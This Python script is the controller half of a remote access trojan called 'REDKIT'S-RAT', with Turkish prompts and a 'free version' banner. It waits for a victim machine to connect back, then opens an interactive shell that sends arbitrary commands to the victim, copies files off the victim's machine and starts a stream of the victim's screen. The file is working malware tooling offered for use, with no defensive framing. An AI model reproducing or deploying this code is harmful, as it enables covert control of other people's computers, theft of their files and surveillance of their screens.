import socket
import sys
import os
import pyfiglet
from colorama import Fore, Back, Style, init
init()

os.system("clear")
egik_yazi = pyfiglet.figlet_format("-REDKIT'S-RAT-", font="slant")
print(Fore.RED + egik_yazi + Fore.RESET)

print(Fore.RED + "    Developer: Redkit" + Fore.RESET)
print(Fore.RED + "    Version:   1v Free")


print(Fore.RED + "--------------------------------------------------------------------------------------------" + Fore.RESET)

print("\n\n\n")
port=int(input(Fore.BLUE + "Dinlemek istediğiniz portu girin: " + Fore.RESET))
baglanti=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
baglanti.bind(("0.0.0.0",port))
print("Sunucu dinleniyor .......")
baglanti.listen(1)
conn,addr=baglanti.accept()
print(f"[+] Target connected. \nTarget: {addr[0]:addr[1]}")

while True:
    emir=input(Fore.RED+"REDKIT> "+Fore.RESET)
    if emir == "exit":
        print("Çıkış yapıldı")
        sys.exit()
        
    elif emir == "clear":
        os.system("clear")
        continue
    
    elif emir == "screenshare":
        try:
            from vidstream import StreamingServer
            screen = StreamingServer("0.0.0.0", 9090)
            screen.start_server()
        except Exception as e:
            print(e)
    
    elif emir.startswith("download"):
        try:
            conn.settimeout(3.5)
            downloadfile = emir.split(" ", 1)[1]
            conn.send(emir.encode("utf-8"))
            with open(downloadfile, "wb") as f:
                while True:
                    data = conn.recv(16384)
                    if not data:
                        f.close()
                        break
                    f.write(data)
        except socket.timeout:
            continue
        except Exception as e:
            print(e)
            
        
        
    conn.send(emir.encode("utf-8"))
    response=conn.recv(16384).decode("utf-8")
    
    if response == "Yayın durduruldu.":
        try:
            screen.stop_server()
            print(response)
            
        except Exception as e:
            print(e)
    
    print(response)
    continue